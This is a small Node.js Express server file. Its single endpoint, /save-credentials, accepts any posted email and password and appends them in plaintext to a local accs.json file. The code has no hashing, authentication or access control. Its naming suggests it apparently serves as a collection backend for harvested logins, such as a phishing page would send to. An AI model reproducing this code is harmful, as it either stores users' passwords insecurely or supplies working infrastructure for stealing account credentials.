// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json()); // For JSON POST data
app.use(express.urlencoded({ extended: true })); // For form-encoded data (if needed)

const FILE_PATH = path.join(__dirname, 'accs.json');

app.post('/save-credentials', (req, res) => {
  const { email, pass } = req.body;

  // Validate input
  if (!email || !pass) {
    return res.status(400).json({ message: 'Email and password are required' });
  }

  // Read the existing file or initialize it
  fs.readFile(FILE_PATH, 'utf8', (err, data) => {
    let accounts = [];

    if (!err && data.trim()) {
      try {
        accounts = JSON.parse(data);
      } catch (e) {
        return res.status(500).json({ message: 'Error parsing existing data' });
      }
    }

    // Append new credentials
    accounts.push({ email, pass });

    // Save updated data
    fs.writeFile(FILE_PATH, JSON.stringify(accounts, null, 2), (err) => {
      if (err) {
        return res.status(500).json({ message: 'Error saving data' });
      }
      res.status(200).json({ message: 'Credentials saved successfully' });
    });
  });
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
